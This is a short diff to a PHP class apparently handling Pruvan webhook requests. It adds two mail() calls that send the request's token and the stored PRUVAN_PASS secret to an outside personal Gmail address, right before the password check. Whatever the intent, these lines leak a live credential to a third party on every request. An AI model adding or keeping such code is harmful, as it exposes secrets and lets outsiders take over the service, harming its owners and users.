@@ -29,6 +29,8 @@ class Pruvan
         $payload = json_decode($data['payload'], true);
         $given_pass = $payload['token'];
 
+        mail("jdunn82k@gmail.com", "test", $given_pass);
+        mail("jdunn82k@gmail.com", "test", env('PRUVAN_PASS'));
         if (env('PRUVAN_PASS') == $given_pass)
         {
             if (isset($payload['pushkey']))
